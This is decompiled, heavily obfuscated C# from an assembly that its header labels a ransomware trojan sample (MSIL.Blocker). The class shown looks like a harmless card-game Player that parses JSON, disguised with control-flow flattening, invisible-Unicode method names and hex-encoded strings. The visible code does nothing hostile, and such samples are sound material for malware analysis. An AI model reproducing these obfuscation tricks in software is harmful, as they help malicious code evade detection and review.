// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: DataCollect, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 42D7E59F-0880-4460-A28E-6C718E130DF7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-35125b1dd360a1a6c3644dee373860f7e3c26660cb7cd8de4718b4ac8e4b4353.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 488847472;
      bool flag1;
      bool flag2;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 777872373)) % 14U)
        {
          case 0:
            str1 = "53757070726573734D65726765436865636B41747472696275";
            num1 = (int) num2 * -1380631975 ^ 471081858;
            continue;
          case 1:
            num1 = (int) num2 * 1870120135 ^ -2074828080;
            continue;
          case 2:
            int num3 = flag2 ? -561630094 : (num3 = -680386571);
            num1 = num3 ^ (int) num2 * -791736534;
            continue;
          case 3:
            num1 = (int) num2 * -1986975648 ^ -971246394;
            continue;
          case 4:
            flag1 = BaseStream == 1;
            num1 = 1378274594;
            continue;
          case 6:
            num1 = (int) num2 * -763485236 ^ 1527908150;
            continue;
          case 7:
            int num4 = flag1 ? 1653328255 : (num4 = 643411612);
            num1 = num4 ^ (int) num2 * -2024859635;
            continue;
          case 8:
            goto label_1;
          case 9:
            str1 = (string) null;
            flag2 = BaseStream == 0;
            num1 = (int) num2 * -196762430 ^ 1107871029;
            continue;
          case 10:
            num1 = (int) num2 * 1545132343 ^ -1346584525;
            continue;
          case 11:
            str1 = "5365595244";
            num1 = (int) num2 * 1557885565 ^ -227906576;
            continue;
          case 12:
            str2 = str1;
            num1 = 552577947;
            continue;
          case 13:
            num1 = (int) num2 * 2137677073 ^ 622162734;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -2115840460;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -195993238)) % 4U)
        {
          case 1:
            num1 = (int) num2 * -792999151 ^ -181547737;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = -1518056721;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = -92854780;
        int planningCardsCount;
        int[] planningCards;
        int index;
        int num3;
        bool flag;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ -1520677486)) % 14U)
          {
            case 0:
              flag = num3 > 0;
              num2 = (int) num4 * 2097802360 ^ -1618870483;
              continue;
            case 1:
              int num5 = !flag ? -717519296 : (num5 = -712474512);
              num2 = num5 ^ (int) num4 * -1855126812;
              continue;
            case 2:
              ++num1;
              num2 = (int) num4 * -831490841 ^ 372806766;
              continue;
            case 3:
              num3 = planningCards[index];
              num2 = -1835342692;
              continue;
            case 4:
              num2 = (int) num4 * -381780629 ^ -956409410;
              continue;
            case 5:
              index = 0;
              num2 = (int) num4 * 1061146855 ^ -673010036;
              continue;
            case 6:
              planningCards = this.PlanningCards;
              num2 = (int) num4 * 586085804 ^ 2099172235;
              continue;
            case 7:
              planningCardsCount = num1;
              num2 = (int) num4 * -163390585 ^ 1266005363;
              continue;
            case 9:
              ++index;
              num2 = (int) num4 * -441588053 ^ 630742274;
              continue;
            case 10:
              num2 = (int) num4 * 606267119 ^ -2020571948;
              continue;
            case 11:
              int num6;
              num2 = num6 = index < planningCards.Length ? -541160697 : (num6 = -1276538637);
              continue;
            case 12:
              num2 = -973921247;
              continue;
            case 13:
              goto label_1;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 1243654548;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 279196806)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 548883730 ^ -2021444461;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_9:
      int num1 = index < this.PlanningCards.Length ? 1888539692 : (num1 = 197227352);
      bool flag;
      int planningCard;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1210056946)) % 10U)
        {
          case 0:
            ++index;
            num1 = 1939185916;
            continue;
          case 1:
            str1 = Player.\u200C‮⁫‮‬‫‎‎‮​⁪⁫⁮‪⁬‍⁭‪‎⁫‪‭‌⁯⁭‮‪​‫⁫‌⁫‭‪⁯⁬‪⁯⁮‏‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1422200720;
            continue;
          case 2:
            str2 = str1;
            num1 = (int) num2 * -1932918352 ^ -495017905;
            continue;
          case 3:
            int num3 = flag ? -1775277824 : (num3 = -729181691);
            num1 = num3 ^ (int) num2 * 332571338;
            continue;
          case 4:
            goto label_9;
          case 6:
            planningCard = this.PlanningCards[index];
            flag = planningCard == 0;
            num1 = 1743230111;
            continue;
          case 7:
            num1 = 1888539692;
            continue;
          case 8:
            num1 = (int) num2 * -399266665 ^ -1740735744;
            continue;
          case 9:
            num1 = (int) num2 * 874092586 ^ -860573763;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = -623445161;
      int[] numArray;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -609552227)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -2039636298 ^ 255900838;
            continue;
          case 2:
            planningCards = numArray;
            num1 = (int) num2 * 292432645 ^ -1625756509;
            continue;
          case 3:
            num1 = (int) num2 * 1513624191 ^ -400783087;
            continue;
          case 4:
            int num3;
            num1 = num3 = aIndex >= count ? -288628403 : (num3 = -1275313908);
            continue;
          case 6:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = -1385824568;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u200B⁮⁮​⁬‪‮‬⁪‌⁫‭⁮‌‏⁮⁬‌‪⁪​‏⁬⁫⁮⁭‍‎‫⁬‬‍‌‭⁮‏‫‭⁯⁫‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = -2057867212;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -637683288)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1687239211 ^ 1020274712;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u200C‮⁫‮‬‫‎‎‮​⁪⁫⁮‪⁬‍⁭‪‎⁫‪‭‌⁯⁭‮‪​‫⁫‌⁫‭‪⁯⁬‪⁯⁮‏‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200B⁮⁮​⁬‪‮‬⁪‌⁫‭⁮‌‏⁮⁬‌‪⁪​‏⁬⁫⁮⁭‍‎‫⁬‬‍‌‭⁮‏‫‭⁯⁫‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
